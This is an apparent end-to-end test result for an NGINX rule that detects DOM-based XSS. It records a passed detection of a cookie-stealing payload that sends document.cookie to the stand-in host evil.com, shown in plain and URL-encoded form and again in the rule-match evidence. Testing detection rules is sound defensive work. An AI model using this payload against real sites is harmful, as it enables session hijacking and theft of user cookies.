name: test_e2e_with_logs[090_XSS_DOM_001]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_001` |
| **Name** | document.location manipulation |
| **Category** | XSS |
| **Subcategory** | dom_based_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `document.location='http://evil.com/?c='+document.cookie`
- **Encoded**: `document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~43000ms
- **Timestamp**: 13:34:12.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1768052052232-8pe45p pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1768052052232-8pe45p pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET
